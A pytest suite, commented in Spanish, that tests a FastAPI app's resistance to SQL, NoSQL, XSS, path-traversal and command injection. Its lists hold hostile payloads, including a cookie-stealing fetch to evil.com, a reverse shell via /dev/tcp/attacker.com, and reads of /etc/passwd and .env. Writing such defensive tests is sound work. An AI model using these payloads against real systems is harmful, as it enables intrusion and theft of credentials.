"""
Tests de Input Validation
Verifica que la aplicación sea resistente a ataques de inyección.
"""
import pytest
from fastapi.testclient import TestClient
from app.main import app


class TestSQLInjectionPrevention:
    """Test suite para prevenir SQL Injection."""
    
    @pytest.fixture
    def client(self):
        """Cliente de test para la aplicación."""
        return TestClient(app)
    
    # Payloads comunes de SQL Injection
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 1=1#",
        "' OR 1=1/*",
        "'; DROP TABLE users; --",
        "'; DROP TABLE users; #",
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "' UNION SELECT * FROM users --",
        "' UNION SELECT null, username, password FROM users --",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR '1'='1' LIMIT 1 --",
        "1 AND 1=1",
        "1 AND 1=2",
        "1 OR 1=1",
        "1' OR '1'='1",
        "1' AND 1=1#",
        "1' AND 1=2#",
        "1' OR 1=1#",
        "1' OR 1=2#",
    ]
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_login_email(self, client, payload):
        """Verifica que payloads SQL Injection en email sean manejados."""
        response = client.post(
            "/api/v1/auth/login",
            json={"email": payload, "password": "somepassword"}
        )
        
        # No debe retornar 500 (error interno del servidor)
        assert response.status_code != 500, (
            f"CRÍTICO: SQL Injection en email causó error 500. "
            f"Payload: {payload}. "
            f"Esto puede indicar SQL Injection exitoso o manejo de errores inadecuado."
        )
        
        # No debe retornar información de base de datos
        response_text = response.text.lower()
        db_errors = ["sql", "mysql", "postgresql", "sqlite", "syntax error", "near"]
        for error in db_errors:
            assert error not in response_text or response.status_code != 500, (
                f"ADVERTENCIA: Posible exposición de error de BD. "
                f"Palabra '{error}' encontrada en respuesta. "
                f"Payload: {payload}"
            )
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_login_password(self, client, payload):
        """Verifica que payloads SQL Injection en password sean manejados."""
        response = client.post(
            "/api/v1/auth/login",
            json={"email": "test@test.com", "password": payload}
        )
        
        assert response.status_code != 500, (
            f"CRÍTICO: SQL Injection en password causó error 500. "
            f"Payload: {payload}"
        )
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_search_params(self, client, payload):
        """Verifica que payloads SQL Injection en búsquedas sean manejados."""
        # Probar en endpoints de búsqueda
        response = client.get(
            f"/api/v1/jobs?q={payload}",
            headers={"Authorization": "Bearer test-token"}
        )
        
        assert response.status_code != 500, (
            f"CRÍTICO: SQL Injection en parámetro de búsqueda causó error 500. "
            f"Payload: {payload}"
        )
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_url_params(self, client, admin_headers, payload):
        """Verifica que payloads SQL Injection en URL params sean manejados."""
        # Probar en parámetros de URL
        response = client.get(
            f"/api/v1/jobs/{payload}",
            headers=admin_headers
        )
        
        # Debe retornar 404 o 422, no 500
        assert response.status_code in [401, 403, 404, 422], (
            f"ADVERTENCIA: SQL Injection en URL param causó error inesperado. "
            f"Status: {response.status_code}. Payload: {payload}"
        )


class TestNoSQLInjectionPrevention:
    """Test suite para prevenir NoSQL Injection."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    # Payloads comunes de NoSQL Injection
    NOSQL_INJECTION_PAYLOADS = [
        {"$gt": ""},
        {"$gte": ""},
        {"$lt": ""},
        {"$lte": ""},
        {"$ne": None},
        {"$exists": True},
        {"$regex": ".*"},
        {"$where": "this.password.length > 0"},
        {"$or": [{}, {}]},
        {"email": {"$ne": None}},
        {"email": {"$gt": ""}},
    ]
    
    @pytest.mark.parametrize("payload", NOSQL_INJECTION_PAYLOADS)
    def test_nosql_injection_in_login(self, client, payload):
        """Verifica que payloads NoSQL Injection sean manejados."""
        # Intentar enviar objetos como email (inyección NoSQL)
        response = client.post(
            "/api/v1/auth/login",
            json={"email": payload, "password": "test"}
        )
        
        # No debe causar error 500 o comportamiento inesperado
        assert response.status_code in [200, 401, 403, 422], (
            f"ADVERTENCIA: NoSQL Injection causó status inesperado: {response.status_code}. "
            f"Payload: {payload}"
        )


class TestXSSPrevention:
    """Test suite para prevenir XSS (Cross-Site Scripting)."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    # Payloads comunes de XSS
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "'><script>alert(1)</script>",
        "\"'><script>alert(1)</script>",
        "<script>document.location='https://evil.com'</script>",
        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
        "javascript:alert(1)",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]
    
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_user_input(self, client, admin_headers, payload):
        """Verifica que payloads XSS en inputs de usuario sean manejados."""
        # Crear usuario con payload XSS
        response = client.post(
            "/api/v1/users",
            json={
                "email": f"test{hash(payload)}@test.com",
                "full_name": payload,
                "password": "TestPassword123!",
                "role": "consultant"
            },
            headers=admin_headers
        )
        
        # Si la creación fue exitosa, verificar que el payload no se ejecute
        if response.status_code == 200:
            data = response.json()
            
            # Verificar que el full_name no contiene el script sin escapar
            full_name = data.get("full_name", "")
            
            # Si el payload se almacenó, debe estar escapado o sanitizado
            if payload in full_name:
                # Verificar que no hay etiquetas script sin escapar
                assert "<script>" not in full_name or "&lt;script&gt;" in full_name, (
                    f"CRÍTICO: XSS payload almacenado sin escapar: {full_name}. "
                    f"Payload original: {payload}"
                )
    
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_job_description(self, client, admin_headers, payload):
        """Verifica que payloads XSS en descripciones de trabajo sean manejados."""
        response = client.post(
            "/api/v1/jobs",
            json={
                "title": "Test Job",
                "description": payload,
                "department": "IT",
                "location": "Remote",
                "sector": "Technology"
            },
            headers=admin_headers
        )
        
        if response.status_code == 200:
            data = response.json()
            description = data.get("description", "")
            
            # Verificar que no hay scripts sin escapar
            if "<script>" in description and "&lt;script&gt;" not in description:
                pytest.warns(UserWarning, (
                    f"ADVERTENCIA: Posible XSS en job description: {description[:100]}"
                ))
    
    def test_reflected_xss_in_error_messages(self, client):
        """Verifica que mensajes de error no reflejen input sin sanitizar."""
        payload = "<script>alert(1)</script>"
        
        response = client.get(f"/api/v1/jobs/{payload}")
        
        # Verificar que la respuesta no contiene el script sin escapar
        response_text = response.text
        
        # Si contiene el payload, debe estar escapado
        if payload in response_text:
            assert "&lt;script&gt;" in response_text or "<script>" not in response_text, (
                f"CRÍTICO: Reflected XSS posible. Payload reflejado sin escapar: {response_text[:200]}"
            )


class TestPathTraversalPrevention:
    """Test suite para prevenir Path Traversal."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    # Payloads comunes de Path Traversal
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "..\\..\\..\\..\\..\\etc\\passwd",
        "etc/passwd",
        "/etc/passwd",
        "./././etc/passwd",
        "../../../etc/hosts",
        "../../app.py",
        "../config.py",
        "../../.env",
        "../../../.env",
        "..%00/",
        "%00",
    ]
    
    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_in_file_upload_path(self, client, admin_headers, payload):
        """Verifica que payloads de path traversal sean manejados."""
        # Probar en endpoints que manejen archivos
        response = client.get(
            f"/api/v1/uploads/{payload}",
            headers=admin_headers
        )
        
        # No debe retornar 200 con contenido de archivo del sistema
        assert response.status_code in [401, 403, 404, 422], (
            f"ADVERTENCIA: Path traversal posible. "
            f"Status: {response.status_code}. Payload: {payload}"
        )
        
        # Verificar que no se retornó contenido de /etc/passwd
        if response.status_code == 200:
            response_text = response.text
            linux_system_files = ["root:", "daemon:", "bin:", "sys:"]
            windows_system_files = ["[boot loader]", "[operating systems]"]
            
            for indicator in linux_system_files + windows_system_files:
                assert indicator not in response_text, (
                    f"CRÍTICO: Path traversal exitoso. "
                    f"Contenido de archivo del sistema retornado. "
                    f"Payload: {payload}"
                )
    
    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_in_url_params(self, client, admin_headers, payload):
        """Verifica path traversal en parámetros de URL."""
        response = client.get(
            f"/api/v1/jobs/{payload}",
            headers=admin_headers
        )
        
        # Debe retornar 404 o 422
        assert response.status_code in [401, 403, 404, 422], (
            f"Path traversal en URL param: {response.status_code}. Payload: {payload}"
        )


class TestCommandInjectionPrevention:
    """Test suite para prevenir Command Injection."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    # Payloads comunes de Command Injection
    COMMAND_INJECTION_PAYLOADS = [
        "; cat /etc/passwd",
        "; whoami",
        "; id",
        "| cat /etc/passwd",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "; ls -la",
        "&& cat /etc/passwd",
        "|| cat /etc/passwd",
        "; ping -c 4 attacker.com",
        "; curl https://evil.com",
        "; wget https://evil.com",
        "; nc attacker.com 9999",
        "; bash -i >& /dev/tcp/attacker.com/9999 0>&1",
        "<script>alert(1)</script>|whoami",
        "\nwhoami",
        "\rcat /etc/passwd",
        "; powershell.exe -Command whoami",
        "& whoami",
    ]
    
    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_in_file_name(self, client, admin_headers, payload):
        """Verifica que payloads de command injection sean manejados."""
        # Probar en upload de archivos o procesamiento de CV
        response = client.post(
            "/api/v1/candidates",
            json={
                "full_name": "Test Candidate",
                "email": f"test{hash(payload)}@test.com",
                "phone": "+1234567890",
                "source": "manual"
            },
            headers=admin_headers
        )
        
        # No debe retornar 500 o ejecutar comandos
        assert response.status_code in [200, 201, 401, 403, 422], (
            f"ADVERTENCIA: Command injection posible. "
            f"Status: {response.status_code}. Payload: {payload}"
        )
        
        # Verificar que no se retornó output de comandos
        if response.status_code == 200:
            response_text = response.text.lower()
            command_outputs = [
                "root:", "daemon:", "bin:",  # /etc/passwd
                "uid=", "gid=", "groups=",  # id command
                "administrator", "nt authority",  # Windows
            ]
            for indicator in command_outputs:
                assert indicator not in response_text, (
                    f"CRÍTICO: Command injection exitoso. "
                    f"Output de comando encontrado: {indicator}. "
                    f"Payload: {payload}"
                )


class TestInputValidation:
    """Test suite para validación general de inputs."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_empty_body_rejected(self, client):
        """Verifica que cuerpos vacíos sean rechazados."""
        response = client.post(
            "/api/v1/auth/login",
            json={}
        )
        
        # Debe retornar 422 (validation error)
        assert response.status_code == 422, (
            f"Body vacío no rechazado. Status: {response.status_code}"
        )
    
    def test_null_values_handled(self, client):
        """Verifica que valores null sean manejados correctamente."""
        response = client.post(
            "/api/v1/auth/login",
            json={"email": None, "password": None}
        )
        
        assert response.status_code == 422, (
            f"Valores null no rechazados. Status: {response.status_code}"
        )
    
    def test_excessive_length_input_rejected(self, client):
        """Verifica que inputs excesivamente largos sean rechazados."""
        long_string = "A" * 10000  # 10KB de texto
        
        response = client.post(
            "/api/v1/auth/login",
            json={"email": long_string, "password": "test"}
        )
        
        # Debe retornar error de validación, no 500
        assert response.status_code in [200, 401, 422, 413], (
            f"Input largo causó error inesperado: {response.status_code}"
        )
    
    def test_special_characters_handled(self, client):
        """Verifica que caracteres especiales sean manejados."""
        special_chars = [
            "test\x00@test.com",  # Null byte
            "test\n@test.com",     # Newline
            "test\r@test.com",     # Carriage return
            "test\t@test.com",     # Tab
            "test\x1b@test.com",   # Escape
        ]
        
        for email in special_chars:
            response = client.post(
                "/api/v1/auth/login",
                json={"email": email, "password": "test"}
            )
            
            assert response.status_code != 500, (
                f"Caracter especial causó error 500: {repr(email)}"
            )
    
    def test_unicode_input_handled(self, client):
        """Verifica que input Unicode sea manejado correctamente."""
        unicode_strings = [
            "日本語@test.com",
            "العربية@test.com",
            "中文@test.com",
            "🎉@test.com",
            "<script>alert(1)</script>@test.com",
        ]
        
        for email in unicode_strings:
            response = client.post(
                "/api/v1/auth/login",
                json={"email": email, "password": "test"}
            )
            
            assert response.status_code != 500, (
                f"Unicode causó error 500: {repr(email)}"
            )


class TestJSONSecurity:
    """Test suite para seguridad de parsing JSON."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_nested_json_depth_limited(self, client):
        """Verifica que profundidad de JSON esté limitada."""
        # Crear JSON profundamente anidado
        nested = {}
        current = nested
        for i in range(1000):
            current["nested"] = {}
            current = current["nested"]
        
        response = client.post(
            "/api/v1/auth/login",
            json=nested
        )
        
        # No debe causar stack overflow
        assert response.status_code in [200, 401, 422], (
            f"JSON anidado causó error: {response.status_code}"
        )
    
    def test_large_json_rejected(self, client):
        """Verifica que JSON muy grande sea rechazado."""
        large_json = {"data": "X" * 10000000}  # ~10MB
        
        response = client.post(
            "/api/v1/auth/login",
            json=large_json
        )
        
        # Debe retornar 413 (Payload Too Large) o similar
        assert response.status_code in [200, 401, 413], (
            f"JSON grande causó error inesperado: {response.status_code}"
        )
